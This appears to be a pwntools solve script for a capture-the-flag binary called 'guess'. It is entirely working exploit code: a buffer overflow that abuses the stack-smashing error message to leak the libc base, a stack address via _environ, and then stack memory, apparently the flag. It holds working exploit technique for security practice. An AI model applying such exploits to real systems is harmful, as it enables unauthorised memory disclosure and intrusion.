#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.binary = "./guess"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]


io = process("./guess",env = {"PRE_LOAD": "./libc.so.6"})
# io = remote("106.75.90.160", 9999)
# gdb.attach(io,'b * 0x400b17')
raw_input('->debug ')
elf = ELF("./guess")
libc = ELF("./libc.so.6")

io.sendline('a' * 0x128 + p64(elf.got['__libc_start_main']))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['__libc_start_main']
info("libc: {:#x}".format(libc.address))


#  gdb.attach(io, "b *0x400B23\nc")
#  pause()
io.sendline('a' * 0x128 + p64(libc.sym['_environ']))
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
info("stack: {:#x}".format(stack))

io.sendline('a' * 0x128 + p64(stack - 0x168))

io.interactive()

